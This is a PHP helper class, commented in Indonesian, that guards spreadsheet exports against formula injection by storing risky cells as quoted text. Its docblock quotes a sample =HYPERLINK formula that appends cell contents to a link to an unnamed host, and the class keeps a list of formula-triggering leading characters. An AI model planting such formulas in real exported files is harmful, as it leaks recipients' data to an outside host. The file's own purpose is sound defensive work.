<?php

namespace App\Support;

use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;

/**
 * Penulis sel spreadsheet yang tidak pernah menghasilkan rumus.
 *
 * ## Mengapa ini ada
 *
 * Isi laporan diketik pengguna, lalu diexport ke `.xlsx` dan dibuka orang lain
 * — Direktur, GM, atau siapa pun yang menerima berkasnya. Excel memperlakukan
 * sel yang diawali `=`, `+`, `-`, atau `@` sebagai **rumus**, bukan teks.
 *
 * Artinya seorang pengisi laporan dapat menuliskan sesuatu seperti
 * `=HYPERLINK("http://…"&A1,"Klik")` pada kolom keterangan, dan berkas itu
 * akan menjalankan sesuatu di komputer penerimanya, bukan di server. Peringatan
 * yang muncul di Excel pun berbunyi seolah berkasnya memang berisi rumus yang
 * sah — sebab, dari sudut pandang Excel, memang begitu.
 *
 * Ini bukan bahaya teoretis: berkas hasil export DAMS memang ditujukan untuk
 * dibuka orang lain, dan itulah seluruh alasan fiturnya ada.
 *
 * ## Cara menutupnya
 *
 * Dua lapis sekaligus:
 *
 * 1. `setCellValueExplicit(..., TYPE_STRING)` — selnya disimpan sebagai teks,
 *    sehingga PhpSpreadsheet tidak menafsirkannya sebagai rumus saat menulis.
 * 2. `setQuotePrefix(true)` — menyalakan penanda kutip pada gaya selnya, yang
 *    memberitahu Excel bahwa isi sel adalah teks apa adanya.
 *
 * Penanda kutip disimpan sebagai **gaya**, bukan sebagai karakter di dalam
 * nilainya. Karena itu isi selnya tetap `=1+1` persis saat dibaca kembali —
 * tidak berubah menjadi `'=1+1`. Menambahkan apostrof ke nilainya sendiri akan
 * merusak data setiap kali berkasnya diexport lalu diimpor lagi.
 */
final class SelAman
{
    /**
     * Karakter pembuka yang membuat Excel menafsirkan sel sebagai rumus.
     *
     * Tab dan carriage return ikut disertakan: keduanya dapat dipakai
     * menyelundupkan `=` di belakangnya, karena Excel memangkas keduanya lebih
     * dulu sebelum menafsirkan isi selnya.
     */
    private const PEMBUKA_BERBAHAYA = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Apakah sebuah nilai akan ditafsirkan Excel sebagai rumus.
     */
    public static function berbahaya(mixed $nilai): bool
    {
        if (! is_string($nilai) || $nilai === '') {
            return false;
        }

        return in_array($nilai[0], self::PEMBUKA_BERBAHAYA, true);
    }

    /**
     * Menulis satu sel tanpa pernah menghasilkan rumus.
     *
     * @param  array{int, int}  $koordinat  [kolom, baris], mulai dari 1
     */
    public static function tulis(Worksheet $sheet, array $koordinat, mixed $nilai): void
    {
        if (! self::berbahaya($nilai)) {
            $sheet->setCellValue($koordinat, $nilai);

            return;
        }

        $sheet->setCellValueExplicit($koordinat, $nilai, DataType::TYPE_STRING);
        $sheet->getStyle($koordinat)->setQuotePrefix(true);
    }
}
